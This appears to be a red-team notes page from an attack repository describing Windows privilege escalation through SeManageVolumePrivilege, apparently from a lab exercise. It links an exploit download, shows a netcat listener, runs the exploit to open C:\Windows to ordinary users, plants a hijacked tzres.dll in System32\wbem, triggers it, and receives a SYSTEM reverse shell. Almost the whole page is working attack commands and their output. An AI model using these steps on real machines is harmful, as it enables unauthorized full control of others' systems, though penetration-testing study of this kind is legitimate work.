---
title: SeManageVolumePrivilege
parent: Attack Repository
grand_parent: Red Team
nav_order: 254
---
# Exploit Download
[https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)

# Listener
```zsh
sudo rlwrap -nlvp 192.168.45.205 135
```

```cmd
c:\Users\Public>.\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 930
DONE 

c:\Users\Public>icacls C:\Windows
icacls C:\Windows
C:\Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Users:(RX)
           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

c:\Users\Public>copy tzres.dll C:\Windows\System32\wbem\tzres.dll
copy tzres.dll C:\Windows\System32\wbem\tzres.dll
        1 file(s) copied.

c:\Users\Public>cd c:\windows\system32\wbem
cd c:\windows\system32\wbem

c:\Windows\System32\wbem>dir c:\Windows\System32\wbem\tzres.dll
dir c:\Windows\System32\wbem\tzres.dll
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of c:\Windows\System32\wbem

09/03/2025  10:05 AM             9,216 tzres.dll
               1 File(s)          9,216 bytes
               0 Dir(s)  14,867,402,752 bytes free
```

```cmd
c:\Windows\System32\wbem>systeminfo
systeminfo
ERROR: The remote procedure call failed.
```

```zsh
sudo rlwrap nc -nlvp 135
[sudo] password for kali: 
listening on [any] 135 ...
connect to [192.168.45.205] from (UNKNOWN) [192.168.146.187] 51356
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

